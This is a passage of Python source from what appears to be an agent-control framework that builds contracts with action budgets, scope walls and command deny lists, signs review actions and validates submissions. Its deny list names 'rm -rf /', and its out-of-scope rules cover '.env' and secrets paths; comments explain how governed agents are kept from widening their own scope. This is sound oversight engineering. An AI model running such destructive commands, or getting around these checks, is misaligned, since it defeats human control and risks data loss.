    workspace_skew = (produced_ws is not None and validator_ws is not None
                      and produced_ws != validator_ws)
    if submitted == validator and not workspace_skew:
        return None
    if workspace_skew:
        # Report the pair that actually differs, or the message names two
        # identical hashes and reads like a bug in the gate.
        reason = "engine_skew_workspace"
        submitted, validator = produced_ws, validator_ws
        produced = f"by the evidence workspace's engine {str(submitted)[:12]}"
    else:
        produced = (f"under engine {str(submitted)[:12]}" if submitted else
                    "by an engine that records no engine fingerprint (pre-A4)")
    remedy = ENGINE_SKEW_REMEDY.format(
        branch="tp/" + str(submission.get("task") or "<task>"),
        outcome=submission.get("outcome") or outcome)
    trace(ws, "loop_gate_blocked", step=step, reason=reason,
          task=submission.get("task"), submitted=submitted,
          validator=validator)
    return {"error": f"{step} evidence was produced by a different engine "
                     f"build — produced {produced}, but this gate validates "
                     f"with {str(validator)[:12]}; " + remedy,
            "step": step,
            "engine_skew": {"submitted": submitted, "validator": validator,
                            "reason": reason}}


# --------------------------------------------------------------- contracts

DEFAULT_DENY = ["git push", "rm -rf /", "pip publish", "npm publish"]
DEFAULT_OUT_OF_SCOPE = [".git/**", ".github/**", "deploy/**", "*.lock",
                        "**/.env", "**/secrets/**",
                        # fnmatch '**/'-globs need a directory prefix, so
                        # ROOT-level .env / secrets/ escaped the family
                        # entirely (EM v3 finding) — cover them explicitly.
                        ".env", "secrets/**",
                        # C2 (R-0009): decomposition floors/config are
                        # default-denied to any unscoped or wildcard-scoped
                        # contract. Deliberately NOT in _SACRED_OUT_OF_SCOPE —
                        # a plan-minted contract with a LITERAL
                        # 'components.yaml' scope entry still writes it (see
                        # scope_violation), which is how governed
                        # decomposition work ships this file; making it
                        # sacred would re-create the scope-precedence
                        # deadlock.
                        "components.yaml"]


DEFAULT_MAX_ACTIONS_RO = 40       # read-only review contracts


def contract_projection(contract: dict | None) -> dict:
    """Return the stable, display-safe view of any supported contract shape.

    Enforcement contracts are intentionally not one schema: build contracts
    carry ``coding`` while review-kernel producer contracts are minimal and
    read-only, and a released producer may retain only identity/mode fields.
    Status surfaces must describe those shapes without inventing authority or
    requiring enforcement-only keys.
    """
    contract = contract if isinstance(contract, dict) else {}
    coding = contract.get("coding")
    coding = coding if isinstance(coding, dict) else {}
    policy = coding.get("command_policy")
    policy = policy if isinstance(policy, dict) else {}
    dod = coding.get("dod")
    dod = dod if isinstance(dod, dict) else {}
    budget = contract.get("budget")
    budget = budget if isinstance(budget, dict) else {}

    def string_list(value):
        return [item for item in value if isinstance(item, str)] \
            if isinstance(value, list) else []

    read_only = bool(contract.get("read_only"))
    coding_scope = string_list(coding.get("scope_paths"))
    write_allow = string_list(contract.get("write_allow"))
    return {
        "mode": "read-only" if read_only else "build",
        "read_only": read_only,
        "scope_paths": coding_scope,
        "display_scope": coding_scope or (write_allow if read_only else []),
        "write_allow": write_allow,
        "out_of_scope_paths": string_list(coding.get("out_of_scope_paths")),
        "deny": string_list(policy.get("deny")),
        "dod": dod,
        "test_command": dod.get("test_command"),
        "max_actions": budget.get("max_actions"),
        "budget": budget,
    }


def build_contract(task: str, *, scope=None, read_only=False, write_allow=None,
                   tools=None, test_command=None, deny_extra=None,
                   max_actions=None, regression_gate=False,
                   plan_minted=False,
                   test_timeout_seconds: int | None = None) -> dict:
    """Build a contract dict — shared by tp.py new and the loop engine so a
    step's contract is exactly what the hook will enforce. Every contract
    carries an ACTION BUDGET (max_actions): the hook counts each governed
    tool call and blocks past the ceiling — mechanical, before the action
    runs, unlike dollar/token spend which stays cooperative.

    plan_minted marks PROVENANCE: True only when the loop engine builds the
    contract from a human-approved plan's task. Only plan-minted contracts
    earn the literal-scope override of DEFAULT_OUT_OF_SCOPE (scope_violation)
    — a CLI `tp new --scope` contract never does, so a governed agent cannot
    re-mint its own path into .git/hooks, CI, deploy or lockfiles."""
    import uuid
    if max_actions is None:
        max_actions = DEFAULT_MAX_ACTIONS_RO if read_only \
            else _canonical_operational_settings().limits.budgets[
                "max_actions"]
    max_actions = int(max_actions)
    if max_actions < 0:
        raise ValueError(
            "max_actions must be >= 0 — 0 means a ZERO-action ceiling "
            "(every governed action blocks); omit it for the default")
    if read_only and tools is None:
        # Persist an explicit closed host-native tool list.  An empty list has
        # historically meant "all tools", which is not a safe default for a
        # read-only authority.  Artifact writers are added only when their
        # target allowlist is also present.
        tools = sorted(READONLY_NATIVE_READ_TOOLS)
        if write_allow:
            tools += sorted(WRITE_TOOLS)
    c = {
        "task_id": "task_" + uuid.uuid4().hex[:8],
        "task": task,
        "allowed_tools": list(tools or []),
        "budget": {"max_actions": int(max_actions),
                   "note": "actions are hook-enforced; dollar spend is "
                           "cooperative (not intercepted pre-spend)"},
        "coding": {
            "scope_paths": list(scope or []),
            "out_of_scope_paths": list(DEFAULT_OUT_OF_SCOPE),
            "command_policy": {"deny": DEFAULT_DENY + list(deny_extra or [])},
            "dod": {"test_command": test_command,
                    "require_clean_scope_diff": not read_only,
                    "regression_gate": bool(regression_gate)},
        },
    }
    if test_timeout_seconds is not None:
        c["coding"]["dod"]["test_timeout_seconds"] = \
            validate_test_timeout_seconds(
                test_timeout_seconds,
                field="coding.dod.test_timeout_seconds",
                plan_minted=bool(plan_minted))
    if plan_minted:
        c["coding"]["plan_minted"] = True
    if read_only:
        c["read_only"] = True
    if write_allow:
        c["write_allow"] = list(write_allow)
    return c


def apply_foreign_state_exclusions(contract: dict, workspace: str, *,
                                   allow_roots=None, actor: str | None = None,
                                   roots=None) -> dict:
    """Compile signed foreign state roots into one contract's write wall."""
    import collision

    detected = list(roots if roots is not None else
                    collision.discover_state_roots(workspace))
    requested = sorted({str(item).replace("\\", "/").strip("/")
                        for item in (allow_roots or []) if str(item).strip()})
    known = {str(row.get("root")) for row in detected}
    unknown = [item for item in requested if item not in known]
    if unknown:
        raise ValueError("foreign-state override does not match a detected "
                         "signed root: " + ", ".join(unknown))
    if requested and not str(actor or "").strip():
        raise ValueError("foreign-state override requires an attributable actor")
    coding = contract.setdefault("coding", {})
    excluded = [row for row in detected if row.get("root") not in requested]
    out = list(coding.get("out_of_scope_paths") or [])
    for row in excluded:
        root = str(row["root"]).rstrip("/")
        for pattern in (root, root + "/**"):
            if pattern not in out:
                out.append(pattern)
    coding["out_of_scope_paths"] = out
    if detected:
        contract["foreign_state"] = {
            "schema": "taskplane.foreign-state-authority/v1",
            "detected": detected,
            "excluded_roots": [row["root"] for row in excluded],
            "overrides": [{"root": root, "actor": str(actor)}
                          for root in requested],
        }
    return contract


# ------------------------------------------------------ submission authority

SUBMISSION_CONTRACT_SCHEMA = "taskplane.submission-contract/v1"
SUBMISSION_STATUS_SCHEMA = "taskplane.submission-status/v1"
SUBMISSION_ARTIFACT_MAX_BYTES = 1024 * 1024

REVIEW_CONTRACT_ACTION_SCHEMA = "taskplane.review-contract-action/v1"
REVIEW_CONTRACT_AUTHORITY_SCHEMA = \
    "taskplane.review-contract-authority/v1"
REVIEW_CONTRACT_ACTION_TTL_SECONDS = 60 * 60
_REVIEW_ACTION_FIELDS = frozenset({
    "schema", "key_id", "action_id", "run_id", "task_id", "role_marker",
    "worker_identity", "issued_at", "expires_at", "workspace_fingerprint",
    "lease_identity", "producer_contract", "result_path", "signature",
})
_REVIEW_LEASE_IDENTITY_FIELDS = (
    "schema", "slot_id", "lens_ids", "target_fingerprint",
    "context_fingerprint", "view_fingerprint", "lease_fingerprint",
    "canonical_revision",
)


def _review_contract_authority_path(workspace: str) -> str:
    return os.path.join(tp_dir(workspace), "review-contract-authority.json")


def _review_contract_authority(workspace: str, *, create: bool) -> dict:
    """Load the local signing authority, creating it only in the issuer.

    This file is control-plane trust material, never a worker contract.  A
    producer consumes the signed action; an active slot file is merely an
    enforcement cache derived after verification.
    """
    path = _review_contract_authority_path(workspace)
    with file_lock(path):
        authority = load_json(path, default=None,
                              what="review contract signing authority")
        if authority is None and create:
            secret = secrets.token_bytes(32)
            authority = {
                "schema": REVIEW_CONTRACT_AUTHORITY_SCHEMA,
                "key_id": hashlib.sha256(secret).hexdigest(),
                "secret": base64.b64encode(secret).decode("ascii"),
            }
            atomic_write_json(path, authority, sort_keys=True)
            try:
                os.chmod(path, 0o600)
            except OSError:
                pass
        if not isinstance(authority, dict) or \
                set(authority) != {"schema", "key_id", "secret"} or \
                authority.get("schema") != REVIEW_CONTRACT_AUTHORITY_SCHEMA:
            raise StateError(path, "review contract signing authority is invalid")
        try:
            secret = base64.b64decode(
                str(authority.get("secret") or ""), validate=True)
        except (ValueError, TypeError) as exc:
            raise StateError(path, "review contract signing authority is invalid") \
                from exc
        if len(secret) != 32 or authority.get("key_id") != \
                hashlib.sha256(secret).hexdigest():
            raise StateError(path, "review contract signing authority is invalid")
        return {"key_id": authority["key_id"], "secret": secret}


def _review_action_bytes(action: dict) -> bytes:
    unsigned = {key: value for key, value in action.items()
                if key != "signature"}
    return json.dumps(unsigned, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False).encode("utf-8")


def _review_action_signature(secret: bytes, action: dict) -> str:
    return hmac.new(secret, _review_action_bytes(action),
                    hashlib.sha256).hexdigest()


def _review_bootstrap_error(workspace: str, reason: str) -> StateError:
    return StateError(
        _review_contract_authority_path(workspace), reason,
        "obtain a fresh exact signed ReviewKernel action; do not create or "
        "broaden an active review slot manually")


def _leased_review_result_path(workspace: str, value: object,
                               lease_fingerprint: object) -> bool:
    """Accept only the one canonical ReviewKernel result for this lease."""
    path = str(value or "").replace("\\", "/")
    fingerprint = str(lease_fingerprint or "")
    if not re.fullmatch(r"[0-9a-f]{64}", fingerprint) or \
            not path.endswith(f"/{fingerprint}.json"):
        return False
    if os.path.isabs(path):
        # A managed task worktree gets an isolated lenses root beneath
        # ``lenses/worktrees/<worktree-key>``.  Derive the one permitted
        # result from that checkout's validated locator instead of matching a
        # shared path fragment: the latter rejected real parallel workers and
        # would make accepting the worktree shape broad enough to admit a
        # sibling worktree.
        try:
            import storage as _runtime_storage
            expected = _runtime_storage.managed_path(
                workspace, "lenses", "results", f"{fingerprint}.json")
        except Exception:
            return False
        return bool(expected) and _same_path(
            os.path.realpath(path), os.path.realpath(expected)
        ) and writable_target(path, [path], workspace)
    return bool(re.fullmatch(
        r"\.(?:eval|em-review)/kernel-v2/results/[0-9a-f]{64}\.json",
        path)) and writable_target(path, [path], workspace)


def issue_review_contract_action(
        workspace: str, *, run_id: str, task_id: str, role_marker: str,
        worker_identity: str, action_id: str, lease: dict,
        producer_contract: dict, result_path: str, now: int | None = None,
        ttl_seconds: int = REVIEW_CONTRACT_ACTION_TTL_SECONDS) -> dict:
    """Sign one exact lease-to-contract bootstrap action for a fresh worker."""
    if not isinstance(lease, dict) or \
            lease.get("schema") != "taskplane.slot-lease/v1":
        raise _review_bootstrap_error(workspace, "review lease is malformed")
    missing = [field for field in _REVIEW_LEASE_IDENTITY_FIELDS
               if field not in lease]
    if missing:
        raise _review_bootstrap_error(
            workspace, "review lease identity is incomplete: " +
            ", ".join(missing))
    if not isinstance(producer_contract, dict) or \
            set(producer_contract) != {
                "task", "task_slot", "read_only", "write_allow"}:
        raise _review_bootstrap_error(
            workspace, "review producer contract schema is malformed")
    write_allow = producer_contract.get("write_allow")
    if producer_contract.get("read_only") is not True or \
            not isinstance(write_allow, list) or \
            write_allow != [result_path] or \
            not _leased_review_result_path(
                workspace, result_path, lease.get("lease_fingerprint")):
        raise _review_bootstrap_error(
            workspace, "review producer contract broadens write authority")
    slot = str(producer_contract.get("task_slot") or "")
    values = (run_id, task_id, role_marker, worker_identity, action_id,
              producer_contract.get("task"), slot, result_path)
    if not all(str(value or "").strip() for value in values) or \
            not _TASK_SLOT_RE.fullmatch(slot) or \
            not str(role_marker).startswith("taskplane-role:tp-"):
        raise _review_bootstrap_error(
            workspace, "review action identity is malformed")
    issued_at = int(_time.time() if now is None else now)
    ttl = int(ttl_seconds)
    if ttl < 1 or ttl > REVIEW_CONTRACT_ACTION_TTL_SECONDS:
        raise _review_bootstrap_error(workspace, "review action TTL is invalid")
    authority = _review_contract_authority(workspace, create=True)
    lease_identity = {field: lease[field]
                      for field in _REVIEW_LEASE_IDENTITY_FIELDS}
    action = {
        "schema": REVIEW_CONTRACT_ACTION_SCHEMA,
        "key_id": authority["key_id"],
        "action_id": str(action_id), "run_id": str(run_id),
        "task_id": str(task_id), "role_marker": str(role_marker),
        "worker_identity": str(worker_identity),
        "issued_at": issued_at, "expires_at": issued_at + ttl,
        "workspace_fingerprint": _workspace_identity_fingerprint(workspace),
        "lease_identity": lease_identity,
        "producer_contract": json.loads(json.dumps(producer_contract)),
        "result_path": str(result_path),
    }
    action["signature"] = _review_action_signature(
        authority["secret"], action)
    return action


def activate_review_contract_action(
        workspace: str, action: dict, *, run_id: str, task_id: str,
        role_marker: str, worker_identity: str, action_id: str,
        lens_ids: list[str], target_fingerprint: str,
        lease_fingerprint: str, canonical_revision: int,
        now: int | None = None) -> dict:
    """Verify one signed action and derive its exact read-only slot.

    Verification completes before any active file is opened or written.  The
    resulting slot is a replaceable enforcement/cache projection and confers
    no authority beyond the signed lease action.
    """
    if not isinstance(action, dict) or set(action) != _REVIEW_ACTION_FIELDS or \
            action.get("schema") != REVIEW_CONTRACT_ACTION_SCHEMA:
        raise _review_bootstrap_error(workspace, "review action schema is malformed")
    authority = _review_contract_authority(workspace, create=False)
    if action.get("key_id") != authority["key_id"] or \
            not hmac.compare_digest(
                str(action.get("signature") or ""),
                _review_action_signature(authority["secret"], action)):
        raise _review_bootstrap_error(workspace, "review action signature is invalid")
    current = int(_time.time() if now is None else now)
    try:
        issued_at = int(action["issued_at"])
        expires_at = int(action["expires_at"])
    except (TypeError, ValueError) as exc:
        raise _review_bootstrap_error(
            workspace, "review action time bounds are malformed") from exc
    if issued_at > current or expires_at < current or expires_at <= issued_at:
        raise _review_bootstrap_error(workspace, "review action is stale or expired")
    if action.get("workspace_fingerprint") != \
            _workspace_identity_fingerprint(workspace):
        raise _review_bootstrap_error(
            workspace, "review action belongs to another workspace")
    expected = {
        "run_id": str(run_id), "task_id": str(task_id),
        "role_marker": str(role_marker),
        "worker_identity": str(worker_identity),
        "action_id": str(action_id),
    }
    for field, value in expected.items():
        if action.get(field) != value:
            raise _review_bootstrap_error(
                workspace, f"review action {field} identity mismatches worker")
    lease_identity = action.get("lease_identity")
    if not isinstance(lease_identity, dict) or \
            set(lease_identity) != set(_REVIEW_LEASE_IDENTITY_FIELDS):
        raise _review_bootstrap_error(workspace, "review lease identity is malformed")
    expected_lease = {
        "schema": "taskplane.slot-lease/v1",
        "lens_ids": list(lens_ids),
        "target_fingerprint": str(target_fingerprint),
        "lease_fingerprint": str(lease_fingerprint),
        "canonical_revision": int(canonical_revision),
    }
    for field, value in expected_lease.items():
        if lease_identity.get(field) != value:
            raise _review_bootstrap_error(
                workspace, f"review action {field} identity mismatches lease")
    producer = action.get("producer_contract")
    result_path = action.get("result_path")
    if not isinstance(producer, dict) or set(producer) != {
            "task", "task_slot", "read_only", "write_allow"} or \
            producer.get("read_only") is not True or \
            producer.get("write_allow") != [result_path] or \
            not _leased_review_result_path(
                workspace, result_path,
                lease_identity.get("lease_fingerprint")):
        raise _review_bootstrap_error(
            workspace, "review producer contract broadens write authority")
    slot = str(producer.get("task_slot") or "")
    if not _TASK_SLOT_RE.fullmatch(slot) or task_slot() != slot:
        raise _review_bootstrap_error(
            workspace, "review action task slot mismatches worker")
    contract = build_contract(
        str(producer.get("task") or ""), read_only=True,
        write_allow=[str(result_path)])
    contract.update({
        "task_id": "review_action_" + hashlib.sha256(
            str(action_id).encode("utf-8")).hexdigest()[:16],
        "task_slot": slot, "authority_source": "signed_action",
        "bootstrap_action_id": str(action_id),
        "bootstrap_key_id": authority["key_id"],
        "bootstrap_worker_identity": str(worker_identity),
        "bootstrap_lease_fingerprint": str(lease_fingerprint),
    })
    return activate(workspace, contract, snapshot="auto",
                    task_slot_override=slot)


EXPANDED_LENS_ROUTE_REQUEST_SCHEMA = \
    "taskplane.expanded-lens-route-provider-request/v1"
_EXPANDED_LENS_ROUTE_REQUEST_FIELDS = frozenset({
    "schema", "workspace", "stage", "target", "context_fingerprint",
    "exact_ordered_lens_ids", "estimated_cost", "policy_version",
    "catalog_version", "action_id",
})
_EXPANDED_LENS_ID_RE = re.compile(r"^[a-z][a-z0-9-]{0,63}$")
_EXPANDED_ROUTE_TEXT_RE = re.compile(r"^[\x21-\x7e]{1,256}$")


def _validated_expanded_lens_route_request_bindings(
        workspace: str, *, stage: str, target: str,
        context_fingerprint: str, extra_lens_ids: list[str],
        expected_cost: int, policy_version: str, catalog_version: str,
        action_id: str) -> dict:
    """Validate worker-owned route facts without granting authority."""
    if stage != "plan":
        raise ValueError("expanded routes are limited to Plan and Evaluate")
    if not isinstance(target, str) or \
            not _EXPANDED_ROUTE_TEXT_RE.fullmatch(target):
        raise ValueError("expanded route target identity is malformed")
    if not isinstance(context_fingerprint, str) or \
            not re.fullmatch(r"[0-9a-f]{64}", context_fingerprint):
        raise ValueError("expanded route context fingerprint is malformed")
    if not isinstance(extra_lens_ids, list) or \
            not 1 <= len(extra_lens_ids) <= 26 or \
            len(set(extra_lens_ids)) != len(extra_lens_ids) or \
            any(not isinstance(lens, str) or
                not _EXPANDED_LENS_ID_RE.fullmatch(lens)
                for lens in extra_lens_ids):
        raise ValueError("expanded route lens identity is malformed")
    if isinstance(expected_cost, bool) or \
            not isinstance(expected_cost, int) or \
            not 1 <= expected_cost <= 1_000_000_000:
        raise ValueError("expanded route expected cost is malformed")
    if not isinstance(policy_version, str) or \
            not _EXPANDED_ROUTE_TEXT_RE.fullmatch(policy_version) or \
            not isinstance(catalog_version, str) or \
            not _EXPANDED_ROUTE_TEXT_RE.fullmatch(catalog_version):
        raise ValueError("expanded route policy/catalog version is malformed")
    if not isinstance(action_id, str) or \
            not _TASK_SLOT_RE.fullmatch(action_id):
        raise ValueError("expanded route action identity is malformed")
    return {
        "workspace": _workspace_identity_fingerprint(workspace),
        "stage": stage,
        "target": target,
        "context_fingerprint": context_fingerprint,
        "exact_ordered_lens_ids": list(extra_lens_ids),
        "estimated_cost": expected_cost,
        "policy_version": policy_version,
        "catalog_version": catalog_version,
        "action_id": action_id,
    }


def build_expanded_lens_route_authority_request(
        workspace: str, *, stage: str, target: str,
        context_fingerprint: str, extra_lens_ids: list[str],
        expected_cost: int, policy_version: str, catalog_version: str,
        action_id: str) -> dict:
    """Serialize the closed request passed to the orchestrator provider.

    This adapter intentionally cannot select or launch a provider, accept a
    locator, supply time or verification functions, inspect custody, issue an
    action, or mutate consumption state.
    """
    return {
        "schema": EXPANDED_LENS_ROUTE_REQUEST_SCHEMA,
        **_validated_expanded_lens_route_request_bindings(
            workspace, stage=stage, target=target,
            context_fingerprint=context_fingerprint,
            extra_lens_ids=extra_lens_ids, expected_cost=expected_cost,
            policy_version=policy_version, catalog_version=catalog_version,
            action_id=action_id),
    }


def expanded_lens_route_provider_request_fingerprint(request: dict) -> str:
    if not isinstance(request, dict) or \
            set(request) != _EXPANDED_LENS_ROUTE_REQUEST_FIELDS or \
            request.get("schema") != EXPANDED_LENS_ROUTE_REQUEST_SCHEMA:
        raise ValueError("expanded route provider request is malformed")
    return hashlib.sha256(json.dumps(
        request, sort_keys=True, separators=(",", ":"),
        ensure_ascii=False, allow_nan=False).encode("utf-8")).hexdigest()


def _workspace_identity_fingerprint(workspace: str) -> str:
    """Opaque checkout identity used to bind lifecycle evidence.

    This is deliberately an identity digest, not ``workspace_fingerprint``:
    the source bytes are expected to change while the contract is active.
    """
    return hashlib.sha256(
        _workspace_identity(workspace).encode("utf-8")).hexdigest()


def _submission_relative_path(workspace: str, value) -> str | None:
    """Return one contained, non-symlink-escaped repository path."""
    raw = str(value or "").replace("\\", "/").strip()
    if (not raw or os.path.isabs(raw) or raw == ".."
            or raw.startswith("../") or "/../" in raw):
        return None
    normal = posixpath.normpath(raw)
    if normal in ("", ".", "..") or normal.startswith("../"):
        return None
    root = _workspace_identity(workspace)
    candidate = os.path.realpath(os.path.join(root, *normal.split("/")))
    try:
        if os.path.commonpath((root, candidate)) != root:
            return None
    except ValueError:
        return None
    return normal


def bind_submission_contract(contract: dict, workspace: str, *, task: str,
                             stage: str, slot: str | None = None,
                             locator: dict, validation_rule: str,
                             required: bool = True) -> dict:
    """Return a JSON-isolated contract bound to one exact submission.

    The locator is declarative.  This helper never creates evidence, changes
    loop state, clears a contract, or performs a gate.
    """
    if not isinstance(contract, dict):
        raise ValueError("submission binding needs a contract object")
    task_name = str(task or "").strip()
    stage_name = str(stage or "").strip()
    rule = str(validation_rule or "").strip()
    if not task_name or not stage_name or not rule:
        raise ValueError("submission task, stage, and validation rule are required")
    if slot is not None and not _TASK_SLOT_RE.fullmatch(str(slot)):
        raise ValueError("submission slot is invalid")
    if not isinstance(locator, dict):
        raise ValueError("submission locator must be an object")
    locator_copy = json.loads(json.dumps(locator))
    locator_type = locator_copy.get("type")
    if locator_type not in {"loop_submission", "artifact"}:
        raise ValueError("unsupported submission locator type")
    if locator_type == "artifact":
        for key in ("path", "receipt_path"):
            normalized = _submission_relative_path(workspace,
                                                   locator_copy.get(key))
            if normalized is None:
                raise ValueError(f"artifact locator {key} must stay in workspace")
            locator_copy[key] = normalized
        schema = str(locator_copy.get("schema") or "").strip()
        if not schema:
            raise ValueError("artifact locator schema is required")
        locator_copy["schema"] = schema
    bound = json.loads(json.dumps(contract))
    bound["submission_contract"] = {
        "schema": SUBMISSION_CONTRACT_SCHEMA,
        "required": bool(required),
        "workspace_fingerprint": _workspace_identity_fingerprint(workspace),
        "task": task_name,
        "stage": stage_name,
        "slot": str(slot) if slot is not None else None,
        "locator": locator_copy,
        "validation_rule": rule,
    }
    return bound


def _submission_result(contract: dict, binding: dict | None, status: str, *,
                       valid: bool = False, block: bool = True,
                       artifact: str = "submission evidence",
                       recovery: str = "return to the orchestrator or human") -> dict:
    binding = binding if isinstance(binding, dict) else {}
    required = binding.get("required") is True
    return {
        "schema": SUBMISSION_STATUS_SCHEMA,
        "status": status,
        "valid": bool(valid),
        "required": required,
        "block": bool(block and required),
        "contract_id": contract.get("task_id") if isinstance(contract, dict)
        else None,
        "workspace_fingerprint": binding.get("workspace_fingerprint"),
        "task": binding.get("task"),
        "stage": binding.get("stage"),
        "slot": binding.get("slot"),
        "artifact": artifact,
        "recovery": recovery,
    }


def _loop_submission_status(workspace: str, contract: dict, binding: dict,
                            loop_state) -> dict:
    artifact = "exact loop submission for this task and stage"
    recovery = ("run `loop submit pass|fail` for this exact task, then let "
                "the orchestrator evaluate `loop gate`")
    if not isinstance(loop_state, dict):
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    if loop_state.get("submission_required") is not True:
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    stage = binding["stage"]
    if loop_state.get("step") != stage:
        return _submission_result(contract, binding, "wrong_stage",
                                  artifact=artifact, recovery=recovery)
    task_name = binding["task"]
    if stage == "execute" and loop_state.get("parallel"):
        rows = loop_state.get("tasks")
        if not isinstance(rows, list):
            return _submission_result(contract, binding, "corrupt",
                                      artifact=artifact, recovery=recovery)
        target = next((row for row in rows if isinstance(row, dict)
                       and str(row.get("id")) == task_name), None)
        submission = target.get("_submission") if target else None
    else:
        submission = loop_state.get("_submission")
    if submission is None:
        return _submission_result(contract, binding, "missing",
                                  artifact=artifact, recovery=recovery)
    if not isinstance(submission, dict):
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    if submission.get("step") != stage:
        return _submission_result(contract, binding, "wrong_stage",
                                  artifact=artifact, recovery=recovery)
    if str(submission.get("task")) != task_name:
        return _submission_result(contract, binding, "wrong_task",
                                  artifact=artifact, recovery=recovery)
    submission_workspace = submission.get("workspace")
    if not isinstance(submission_workspace, str) or \
            _workspace_identity_fingerprint(submission_workspace) != \
            binding["workspace_fingerprint"]:
        return _submission_result(contract, binding, "wrong_workspace",
                                  artifact=artifact, recovery=recovery)
    snapshot = submission.get("snapshot")
    fingerprint = submission.get("fingerprint")
    evidence_paths = submission.get("evidence_paths")
    if (not isinstance(snapshot, str) or not snapshot
            or not isinstance(fingerprint, str)
            or not re.fullmatch(r"[0-9a-f]{64}", fingerprint)
            or not isinstance(evidence_paths, list)
            or len(evidence_paths) > 128
            or any(_submission_relative_path(submission_workspace, item) is None
                   for item in evidence_paths)):
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    try:
        current = workspace_fingerprint(
            submission_workspace, snapshot, extra_paths=evidence_paths)
    except Exception:
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    if current != fingerprint:
        return _submission_result(contract, binding, "stale",
                                  artifact=artifact, recovery=recovery)
    return _submission_result(contract, binding, "valid", valid=True,
                              block=False, artifact=artifact,
                              recovery="submission is ready for orchestrator review")


def _artifact_submission_status(workspace: str, contract: dict,
                                binding: dict) -> dict:
    locator = binding["locator"]
    result_rel = _submission_relative_path(workspace, locator.get("path"))
    receipt_rel = _submission_relative_path(workspace,
                                           locator.get("receipt_path"))
    artifact = result_rel or "leased review result"
    recovery = ("write the exact leased artifact and its matching host "
                "observation receipt, or return to the orchestrator/human")
    if result_rel is None or receipt_rel is None:
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    result_path = os.path.join(workspace, *result_rel.split("/"))
    receipt_path = os.path.join(workspace, *receipt_rel.split("/"))
    try:
        if os.path.getsize(result_path) > SUBMISSION_ARTIFACT_MAX_BYTES:
            return _submission_result(contract, binding, "corrupt",
                                      artifact=artifact, recovery=recovery)
        with open(result_path, "rb") as stream:
            raw = stream.read(SUBMISSION_ARTIFACT_MAX_BYTES + 1)
    except FileNotFoundError:
        return _submission_result(contract, binding, "missing",
                                  artifact=artifact, recovery=recovery)
    except OSError:
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    if len(raw) > SUBMISSION_ARTIFACT_MAX_BYTES:
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    try:
        payload = json.loads(raw.decode("utf-8"))
    except (UnicodeDecodeError, ValueError):
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    if not isinstance(payload, dict) or payload.get("schema") != \
            locator.get("schema"):
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    try:
        if os.path.getsize(receipt_path) > SUBMISSION_ARTIFACT_MAX_BYTES:
            return _submission_result(contract, binding, "corrupt",
                                      artifact=artifact, recovery=recovery)
        receipt = load_json(receipt_path, what="submission receipt")
    except FileNotFoundError:
        return _submission_result(contract, binding, "unobserved",
                                  artifact=artifact, recovery=recovery)
    except StateError as exc:
        if "missing submission receipt" in str(exc):
            return _submission_result(contract, binding, "unobserved",
                                      artifact=artifact, recovery=recovery)
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    except OSError:
        return _submission_result(contract, binding, "corrupt",
                                  artifact=artifact, recovery=recovery)
    expected_digest = hashlib.sha256(raw).hexdigest()
    if (not isinstance(receipt, dict)
            or receipt.get("schema") != "taskplane.slot-write-observation/v3"
            or receipt.get("contract_task_slot") != binding.get("slot")
            or _submission_relative_path(workspace,
                                         receipt.get("result_path")) != result_rel
            or receipt.get("result_sha256") != expected_digest):
        return _submission_result(contract, binding, "unobserved",
                                  artifact=artifact, recovery=recovery)
    return _submission_result(contract, binding, "valid", valid=True,
                              block=False, artifact=artifact,
                              recovery="submission is ready for orchestrator review")


def submission_status(workspace: str, contract: dict, *,
                      observed_slot: str | None = None,
                      loop_state=None) -> dict:
    """Read-only validation of the evidence named by an active contract."""
    if not isinstance(contract, dict):
        return _submission_result({}, None, "corrupt")
    binding = contract.get("submission_contract")
    if binding is None:
        return _submission_result(contract, None, "not_required",
                                  block=False,
                                  recovery="no submission contract is active")
    if not isinstance(binding, dict):
        return _submission_result(contract, None, "corrupt")
    if binding.get("required") is not True:
        return _submission_result(contract, binding, "not_required",
                                  block=False,
                                  recovery="this contract does not require a submission")
    if (binding.get("schema") != SUBMISSION_CONTRACT_SCHEMA
            or not isinstance(binding.get("workspace_fingerprint"), str)
            or not re.fullmatch(r"[0-9a-f]{64}",
                                binding.get("workspace_fingerprint", ""))
            or not str(binding.get("task") or "").strip()
            or not str(binding.get("stage") or "").strip()
            or not str(binding.get("validation_rule") or "").strip()
            or not isinstance(binding.get("locator"), dict)):
        return _submission_result(contract, binding, "corrupt")
    if _workspace_identity_fingerprint(workspace) != \
            binding["workspace_fingerprint"]:
        return _submission_result(contract, binding, "wrong_workspace")
    expected_slot = binding.get("slot")
    if observed_slot is not None and observed_slot != expected_slot:
        return _submission_result(contract, binding, "wrong_slot")
    locator_type = binding["locator"].get("type")
    if locator_type == "loop_submission":
        return _loop_submission_status(workspace, contract, binding,
                                       loop_state)
    if locator_type == "artifact":
        return _artifact_submission_status(workspace, contract, binding)
    return _submission_result(contract, binding, "corrupt")


def stop_submission_decision(workspace: str, contract: dict, **kwargs) -> dict:
    """Host-neutral lifecycle alias; validation only, never a transition."""
    return submission_status(workspace, contract, **kwargs)


def requirement_coverage_errors(tasks, requirement_lookup,
                                default_requirement=None,
                                *, require_passed=False) -> list[str]:
    """Prove every top-level acceptance criterion has a task owner.

    `acceptance_refs` contains exact requirement-acceptance strings. A task
    without explicit criteria owns its whole requirement for compatibility;
    explicit criteria only count automatically when they are exact matches.
    """
    errors: list[str] = []
    owned: dict[str, dict[str, set[str]]] = {}
    records: dict[str, dict] = {}
    for task in tasks or []:
        rid = task.get("req") or default_requirement
        rec = requirement_lookup(rid) if rid else None
        if not rec:
            if rid:
                errors.append(f"task {task.get('id', '?')}: requirement "
